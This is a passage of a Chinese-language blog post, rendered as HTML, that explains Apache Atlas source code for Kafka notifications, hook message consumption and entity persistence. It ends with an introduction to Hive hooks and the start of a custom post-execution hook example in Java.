FailedMessagesLogger logger)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (messages == <span class="keyword">null</span> || messages.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> maxAttempts         = maxRetries &lt; <span class="number">1</span> ? <span class="number">1</span> : maxRetries;</span><br><span class="line">        Exception notificationFailure = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> numAttempt = <span class="number">1</span>; numAttempt &lt;= maxAttempts; numAttempt++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (numAttempt &gt; <span class="number">1</span>) &#123; <span class="comment">// retry attempt</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    LOG.debug(<span class="string">&quot;Sleeping for &#123;&#125; ms before retry&quot;</span>, notificationRetryInterval);</span><br><span class="line"></span><br><span class="line">                    Thread.sleep(notificationRetryInterval);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                    LOG.error(<span class="string">&quot;Notification hook thread sleep interrupted&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ugi == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>

<h4 id="Notification相关源码"><a href="#Notification相关源码" class="headerlink" title="Notification相关源码"></a>Notification相关源码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kafka specific access point to the Atlas notification framework.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(3)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaNotification</span> <span class="keyword">extends</span> <span class="title">AbstractNotification</span> <span class="keyword">implements</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG = LoggerFactory.getLogger(KafkaNotification.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>    <span class="keyword">static</span> <span class="keyword">final</span> String PROPERTY_PREFIX            = <span class="string">&quot;atlas.kafka&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>    <span class="keyword">static</span> <span class="keyword">final</span> String ATLAS_HOOK_TOPIC           = AtlasConfiguration.NOTIFICATION_HOOK_TOPIC_NAME.getString();</span><br><span class="line">    <span class="keyword">public</span>    <span class="keyword">static</span> <span class="keyword">final</span> String ATLAS_ENTITIES_TOPIC       = AtlasConfiguration.NOTIFICATION_ENTITIES_TOPIC_NAME.getString();</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> String CONSUMER_GROUP_ID_PROPERTY = <span class="string">&quot;group.id&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_CONSUMER_CLOSED_ERROR_MESSAGE = <span class="string">&quot;This consumer has already been closed.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;NotificationType, String&gt; TOPIC_MAP = <span class="keyword">new</span> HashMap&lt;NotificationType, String&gt;() &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            put(NotificationType.HOOK, ATLAS_HOOK_TOPIC);</span><br><span class="line">            put(NotificationType.ENTITIES, ATLAS_ENTITIES_TOPIC);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Properties    properties;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Long          pollTimeOutMs;</span><br><span class="line">    <span class="keyword">private</span>       KafkaConsumer consumer;</span><br><span class="line">    <span class="keyword">private</span>       KafkaProducer producer;</span><br><span class="line">    <span class="keyword">private</span>       String        consumerClosedErrorMsg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- Constructors ----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Construct a KafkaNotification.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> applicationProperties  the application properties used to configure Kafka</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> AtlasException if the notification interface can not be created</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Inject</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">KafkaNotification</span><span class="params">(Configuration applicationProperties)</span> <span class="keyword">throws</span> AtlasException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(applicationProperties);</span><br><span class="line"></span><br><span class="line">        LOG.info(<span class="string">&quot;==&gt; KafkaNotification()&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Configuration kafkaConf = ApplicationProperties.getSubsetConfiguration(applicationProperties, PROPERTY_PREFIX);</span><br><span class="line"></span><br><span class="line">        properties             = ConfigurationConverter.getProperties(kafkaConf);</span><br><span class="line">        pollTimeOutMs          = kafkaConf.getLong(<span class="string">&quot;poll.timeout.ms&quot;</span>, <span class="number">1000</span>);</span><br><span class="line">        consumerClosedErrorMsg = kafkaConf.getString(<span class="string">&quot;error.message.consumer_closed&quot;</span>, DEFAULT_CONSUMER_CLOSED_ERROR_MESSAGE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Override default configs</span></span><br><span class="line">        properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, <span class="string">&quot;earliest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> oldApiCommitEnableFlag = kafkaConf.getBoolean(<span class="string">&quot;auto.commit.enable&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//set old autocommit value if new autoCommit property is not set.</span></span><br><span class="line">        properties.put(<span class="string">&quot;enable.auto.commit&quot;</span>, kafkaConf.getBoolean(<span class="string">&quot;enable.auto.commit&quot;</span>, oldApiCommitEnableFlag));</span><br><span class="line">        properties.put(<span class="string">&quot;session.timeout.ms&quot;</span>, kafkaConf.getString(<span class="string">&quot;session.timeout.ms&quot;</span>, <span class="string">&quot;30000&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if no value is specified for max.poll.records, set to 1</span></span><br><span class="line">        properties.put(<span class="string">&quot;max.poll.records&quot;</span>, kafkaConf.getInt(<span class="string">&quot;max.poll.records&quot;</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        LOG.info(<span class="string">&quot;&lt;== KafkaNotification()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">    <span class="comment">// ----- AbstractNotification --------------------------------------------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendInternal</span><span class="params">(NotificationType type, List&lt;String&gt; messages)</span> <span class="keyword">throws</span> NotificationException </span>&#123;</span><br><span class="line">        <span class="comment">// 检测消息服务器的生产者是否创建，</span></span><br><span class="line">        <span class="keyword">if</span> (producer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//创建消息服务器的生产者</span></span><br><span class="line">            createProducer();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//发送消息</span></span><br><span class="line">        sendInternalToProducer(producer, type, messages);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将消息发送到发送到kafka服务器</span></span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sendInternalToProducer</span><span class="params">(Producer p, NotificationType type, List&lt;String&gt; messages)</span> <span class="keyword">throws</span> NotificationException </span>&#123;</span><br><span class="line">        <span class="comment">// 这是从hook过来的消息，所以消息是放入到ATLAS_HOOK这个topic</span></span><br><span class="line">        String               topic           = TOPIC_MAP.get(type);</span><br><span class="line">        List&lt;MessageContext&gt; messageContexts = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 异步把所有的消息全部发送消息服务器指定的topic.</span></span><br><span class="line">        <span class="keyword">for</span> (String message : messages) &#123;</span><br><span class="line">            ProducerRecord record = <span class="keyword">new</span> ProducerRecord(topic, message);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;Sending message for topic &#123;&#125;: &#123;&#125;&quot;</span>, topic, message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Future future = p.send(record);</span><br><span class="line"></span><br><span class="line">            messageContexts.add(<span class="keyword">new</span> MessageContext(future, message));</span><br><span class="line">        &#125;</span><br><span class="line">      ......</span><br></pre></td></tr></table></figure>

<h4 id="消费kafka消息"><a href="#消费kafka消息" class="headerlink" title="消费kafka消息"></a>消费<code>kafka</code>消息</h4><p>start()实现一个后台的<code>job</code>消费从hook发送过来的数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Consumer of notifications from hooks e.g., hive hook etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(4)</span></span><br><span class="line"><span class="meta">@DependsOn(value = &#123;&quot;atlasTypeDefStoreInitializer&quot;, &quot;atlasTypeDefGraphStoreV2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotificationHookConsumer</span> <span class="keyword">implements</span> <span class="title">Service</span>, <span class="title">ActiveStateChangeHandler</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> AtlasException </span>&#123;</span><br><span class="line">        <span class="comment">// 根据配置文件判断消息消费这是否开启</span></span><br><span class="line">        <span class="keyword">if</span> (consumerDisabled) &#123;</span><br><span class="line">            LOG.info(<span class="string">&quot;Hook consumer stopped. No hook messages will be processed. &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Set property &#x27;&#123;&#125;&#x27; to false to start consuming hook messages.&quot;</span>, CONSUMER_DISABLED);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        startInternal(applicationProperties, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startInternal</span><span class="params">(Configuration configuration, ExecutorService executorService)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (consumers == <span class="keyword">null</span>) &#123;</span><br><span class="line">            consumers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (executorService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            executors = executorService;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 从配置文件读取配置检查HA是否开启,HA没有开启使用内联消费消息</span></span><br><span class="line">        <span class="keyword">if</span> (!HAConfiguration.isHAEnabled(configuration)) &#123;</span><br><span class="line">            LOG.info(<span class="string">&quot;HA is disabled, starting consumers inline.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            startConsumers(executorService);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 启动后台线程消费kafka消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> executorService 异步提交消费任务的线程。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startConsumers</span><span class="params">(ExecutorService executorService)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取配置在配置文件中，消费kafka消息的线程数量。没有配置默认值是1</span></span><br><span class="line">        <span class="keyword">int</span>                                          numThreads            = applicationProperties.getInt(CONSUMER_THREADS_PROPERTY, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 根据获取到的配置的数量创建对应的数量的消费者</span></span><br><span class="line">        List&lt;NotificationConsumer&lt;HookNotification&gt;&gt; notificationConsumers = notificationInterface.createConsumers(NotificationType.HOOK, numThreads);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (executorService == <span class="keyword">null</span>) &#123;</span><br><span class="line">            executorService = Executors.newFixedThreadPool(notificationConsumers.size(), <span class="keyword">new</span> ThreadFactoryBuilder().setNameFormat(THREADNAME_PREFIX + <span class="string">&quot; thread-%d&quot;</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        executors = executorService;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> NotificationConsumer&lt;HookNotification&gt; consumer : notificationConsumers) &#123;</span><br><span class="line">            <span class="comment">//创建kafka消息的消费者</span></span><br><span class="line">            HookConsumer hookConsumer = <span class="keyword">new</span> HookConsumer(consumer);</span><br><span class="line"></span><br><span class="line">            consumers.add(hookConsumer);</span><br><span class="line">            <span class="comment">// 启动线程开始消费消息</span></span><br><span class="line">            executors.submit(hookConsumer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>消费消息的处理逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            LOG.info(<span class="string">&quot;==&gt; HookConsumer doWork()&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置为可运行状态。</span></span><br><span class="line">            shouldRun.set(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//检测Atlas服务是否正常，当Atlas的服务没有正常启动的时候当前线程进休眠状态，休眠时间1000ms</span></span><br><span class="line">            <span class="keyword">if</span> (!serverAvailable(<span class="keyword">new</span> NotificationHookConsumer.Timer())) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 只要是可运行状态会一直运行</span></span><br><span class="line">                <span class="keyword">while</span> (shouldRun.get()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 从kafka的消息服务器中获取数据，由于构造消费者的时候。是ATLAS_HOOK的消息。所以在消费的时候也是消费ATLAS_HOOK里面的消息。</span></span><br><span class="line">                        List&lt;AtlasKafkaMessage&lt;HookNotification&gt;&gt; messages = consumer.receive();</span><br><span class="line">                        <span class="comment">// 遍历从kafka获取的每一个消息</span></span><br><span class="line">                        <span class="keyword">for</span> (AtlasKafkaMessage&lt;HookNotification&gt; msg : messages) &#123;</span><br><span class="line">                            <span class="comment">// 处理从kafka获取到的每一个消息,并且提交</span></span><br><span class="line">                            handleMessage(msg);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalStateException ex) &#123;</span><br><span class="line">                        adaptiveWaiter.pause(ex);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (shouldRun.get()) &#123;</span><br><span class="line">                            LOG.warn(<span class="string">&quot;Exception in NotificationHookConsumer&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">                            adaptiveWaiter.pause(e);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (consumer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    LOG.info(<span class="string">&quot;closing NotificationConsumer&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    consumer.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                LOG.info(<span class="string">&quot;&lt;== HookConsumer doWork()&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="meta">@VisibleForTesting</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(AtlasKafkaMessage&lt;HookNotification&gt; kafkaMsg)</span> <span class="keyword">throws</span> AtlasServiceException, AtlasException </span>&#123;</span><br><span class="line">            AtlasPerfTracer  perf        = <span class="keyword">null</span>;</span><br><span class="line">            HookNotification message     = kafkaMsg.getMessage();</span><br><span class="line">            String           messageUser = message.getUser();</span><br><span class="line">            <span class="keyword">long</span>             startTime   = System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">boolean</span>          isFailedMsg = <span class="keyword">false</span>;</span><br><span class="line">            AuditLog         auditLog = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//日志消息</span></span><br><span class="line">            <span class="keyword">if</span> (AtlasPerfTracer.isPerfTraceEnabled(PERF_LOG)) &#123;</span><br><span class="line">                perf = AtlasPerfTracer.getPerfTracer(PERF_LOG, message.getType().name());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 判断当前消息是否已经被消费过，消费下一条消息</span></span><br><span class="line">                <span class="keyword">if</span>(failedCommitOffsetRecorder.isMessageReplayed(kafkaMsg.getOffset())) &#123;</span><br><span class="line">                    commit(kafkaMsg);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 预处理从kafka获取的消息，包括处理消息的上下文</span></span><br><span class="line">                PreprocessorContext context = preProcessNotificationMessage(kafkaMsg);</span><br><span class="line">                <span class="comment">// 当前消息为空，消费下一条消息</span></span><br><span class="line">                <span class="keyword">if</span> (isEmptyMessage(kafkaMsg)) &#123;</span><br><span class="line">                    commit(kafkaMsg);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              ......</span><br></pre></td></tr></table></figure>

<h4 id="将消息持久化"><a href="#将消息持久化" class="headerlink" title="将消息持久化"></a>将消息持久化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建或者更新Atlas中的实体</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> entities           需要创建或者更新的实体信息</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> isPartialUpdate     分区是否更新</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> AtlasBaseException 处理过程中出现的异常</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createOrUpdate</span><span class="params">(AtlasEntitiesWithExtInfo entities, <span class="keyword">boolean</span> isPartialUpdate, PreprocessorContext context)</span> <span class="keyword">throws</span> AtlasBaseException </span>&#123;</span><br><span class="line">            List&lt;AtlasEntity&gt; entitiesList = entities.getEntities();</span><br><span class="line">            AtlasEntityStream entityStream = <span class="keyword">new</span> AtlasEntityStream(entities);</span><br><span class="line">            <span class="comment">// 没有设置批量提交的参数，或者当前数据不满足一次批量提交，单次提交。</span></span><br><span class="line">            <span class="keyword">if</span> (commitBatchSize &lt;= <span class="number">0</span> || entitiesList.size() &lt;= commitBatchSize) &#123;</span><br><span class="line">                <span class="comment">// 调用AtlasEntityStore创建的接口创建消息,后续持久化调用相同的接口。</span></span><br><span class="line">                EntityMutationResponse response = atlasEntityStore.createOrUpdate(entityStream, isPartialUpdate);</span><br><span class="line"></span><br><span class="line">                recordProcessedEntities(response, context);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<h4 id="数据的校验以及，以及格式的转换"><a href="#数据的校验以及，以及格式的转换" class="headerlink" title="数据的校验以及，以及格式的转换"></a>数据的校验以及，以及格式的转换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EntityMutationResponse</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;EntityOperation, List&lt;AtlasEntityHeader&gt;&gt; mutatedEntities;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt;                           guidAssignments;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h4 id="持久化数据"><a href="#持久化数据" class="headerlink" title="持久化数据"></a>持久化数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EntityGraphMapper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG = LoggerFactory.getLogger(EntityGraphMapper.class);</span><br><span class="line">  ......</span><br><span class="line">    <span class="function"><span class="keyword">public</span> AtlasVertex <span class="title">createVertex</span><span class="params">(AtlasEntity entity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 生成全局唯一的guid，调用util工具包直接生成。</span></span><br><span class="line">        <span class="keyword">final</span> String guid = UUID.randomUUID().toString();</span><br><span class="line">        <span class="keyword">return</span> createVertexWithGuid(entity, guid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据所给的guid,以及entity创建顶点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> entity  创建顶点的实体数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> guid    当前实体的guid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>        创建完成之后的顶点数据的封装</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AtlasVertex <span class="title">createVertexWithGuid</span><span class="params">(AtlasEntity entity, String guid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; createVertex(&#123;&#125;)&quot;</span>, entity.getTypeName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AtlasEntityType entityType = typeRegistry.getEntityTypeByName(entity.getTypeName());</span><br><span class="line">        <span class="comment">// 创建图的顶点</span></span><br><span class="line">        AtlasVertex ret = createStructVertex(entity);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String superTypeName : entityType.getAllSuperTypes()) &#123;</span><br><span class="line">            AtlasGraphUtilsV2.addEncodedProperty(ret, SUPER_TYPES_PROPERTY_KEY, superTypeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, GUID_PROPERTY_KEY, guid);</span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, VERSION_PROPERTY_KEY, getEntityVersion(entity));</span><br><span class="line"></span><br><span class="line">        GraphTransactionInterceptor.addToVertexCache(guid, ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">    <span class="function"><span class="keyword">private</span> AtlasVertex <span class="title">createStructVertex</span><span class="params">(AtlasStruct struct)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; createStructVertex(&#123;&#125;)&quot;</span>, struct.getTypeName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建图的节点</span></span><br><span class="line">        <span class="keyword">final</span> AtlasVertex ret = graph.addVertex();</span><br><span class="line"></span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, ENTITY_TYPE_PROPERTY_KEY, struct.getTypeName());</span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, STATE_PROPERTY_KEY, AtlasEntity.Status.ACTIVE.name());</span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, TIMESTAMP_PROPERTY_KEY, RequestContext.get().getRequestTime());</span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, MODIFICATION_TIMESTAMP_PROPERTY_KEY, RequestContext.get().getRequestTime());</span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, CREATED_BY_KEY, RequestContext.get().getUser());</span><br><span class="line">        AtlasGraphUtilsV2.setEncodedProperty(ret, MODIFIED_BY_KEY, RequestContext.get().getUser());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&lt;== createStructVertex(&#123;&#125;)&quot;</span>, struct.getTypeName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<h2 id="Hive-Hooks"><a href="#Hive-Hooks" class="headerlink" title="Hive Hooks"></a>Hive Hooks</h2><p>关于数据治理和元数据管理框架，业界有许多开源的系统，比如Apache Atlas，这些开源的软件可以在复杂的场景下满足元数据管理的需求。其实Apache Atlas对于Hive的元数据管理，使用的是Hive的Hooks。需要进行如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hive.exec.post.hooks&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;org.apache.atlas.hive.hook.HiveHook&lt;value/&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>

<p>通过Hook监听Hive的各种事件，比如创建表，修改表等，然后按照特定的格式把收集的数据推送到Kafka，最后消费元数据并存储。</p>
<p>Hooks 是一种事件和消息机制， 可以将事件绑定在内部 Hive 的执行流程中，而无需重新编译 Hive。Hook 提供了扩展和继承外部组件的方式。根据不同的 Hook 类型，可以在不同的阶段运行。</p>
<ul>
<li>Pre-execution Hook 在执行引擎执行查询之前被调用。这个需要在 Hive 对查询计划进行过优化之后才可以使用。</li>
<li>Post-execution hooks 在执行计划执行结束结果返回给用户之前被调用。</li>
<li>Failure-execution hooks 在执行计划失败之后被调用。</li>
<li>Pre-driver-run 和 post-driver-run 是在查询运行的时候运行的。</li>
<li>Pre-semantic-analyzer and Post-semantic-analyzer Hook 在 Hive 对查询语句进行语义分析的时候调用。</li>
</ul>
<blockquote>
<p>对于Hive Hooks，给出hive.exec.post.hook的使用案例，该Hooks会在查询执行之后，返回结果之前运行。</p>
</blockquote>
<p>Hive hook是hive的钩子函数，可以嵌入HQL执行的过程中运行，比如下面的这几种情况。</p>
<p>具体实现代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomPostHook</span> <span class="keyword">implements</span> <span class="title">ExecuteWithHookContext</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(CustomPostHook.class);</span><br><span class="line">    <span class="comment">// 存储Hive的SQL操作类型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HashSet&lt;String&gt; OPERATION_NAMES = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// HiveOperation是一个枚举类，封装了Hive的SQL操作类型</span></span><br><span class="line">    <span class="comment">// 监控SQL操作类型</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 建表</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.CREATETABLE.getOperationName());</span><br><span class="line">        <span class="comment">// 修改数据库属性</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERDATABASE.getOperationName());</span><br><span class="line">        <span class="comment">// 修改数据库属主</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERDATABASE_OWNER.getOperationName());</span><br><span class="line">        <span class="comment">// 修改表属性,添加列</span></span><br><span class="line">        